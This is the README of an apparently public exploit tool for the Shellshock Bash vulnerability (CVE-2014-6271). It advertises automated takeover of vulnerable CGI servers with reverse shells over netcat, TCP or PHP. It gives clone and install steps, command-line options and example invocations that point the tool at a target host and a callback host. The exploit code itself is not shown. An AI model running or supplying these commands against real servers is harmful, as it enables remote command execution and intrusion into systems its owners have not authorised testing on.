# Shellshock Exploit (CVE-2014-6271)

## Description
The Shellshock Exploit is a tool designed to efficiently exploit the Shellshock vulnerability (CVE-2014-6271) in susceptible CGI servers, enabling a precise takeover of the target server. Shellshock is a critical security vulnerability that affects the Bash shell, allowing attackers to execute arbitrary commands on the targeted system.

## Key Features
- **Exploit Automation:** Automates the exploitation of the Shellshock vulnerability in CGI scripts, streamlining the process for penetration testing and security research.
- **Reverse Shell Connectivity:** Provides options for establishing a reverse shell connection to the target server, supporting various methods such as Netcat (nc), TCP, and PHP.
- **Customizable Options:** Allows users to specify the target host, CGI script, remote host for the reverse shell, port, and preferred shell method through command-line options.

## CVE Information
- CVE Number: [CVE-2014-6271](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271)
- CVE Description: Bash through 4.3 allows remote attackers to execute arbitrary commands via crafted environment variables passed to Bash scripts.

After installing the libcurl development package, attempt to install the CVE-2014-6271-Shellshock:
```
git clone https://github.com/MY7H404/CVE-2014-6271-Shellshock.git
cd CVE-2014-6271-Shellshock
pip3 install -r requirements.txt
python3 shellshock.py -a HOST -u /cgi/test -r REMOTE -p 1337 -s tcp
```

## Usage
```
python3 shellshock.py [-h] -a HOST -u URI -r REMOTE -p PORT [-s {nc,tcp,php}]
```

## Options
```
-h, --help: Show help message and exit
-a HOST, --host HOST: Specify a remote host to test
-u URI, --uri URI: Specify a CGI script to test (e.g., /cgi/test)
-r REMOTE, --remote REMOTE: Specify the host for the reverse shell connection
-p PORT, --port PORT: Specify the port for the reverse shell connection
-s {nc,tcp,php}, --shell {nc,tcp,php}: Choose your preferred reverse shell method for seamless connectivity (default 'nc')
```

## Example
```
python3 shellshock.py -a 10.10.10.10 -u /cgi/test -r localhost -p 4444 -s tcp
```
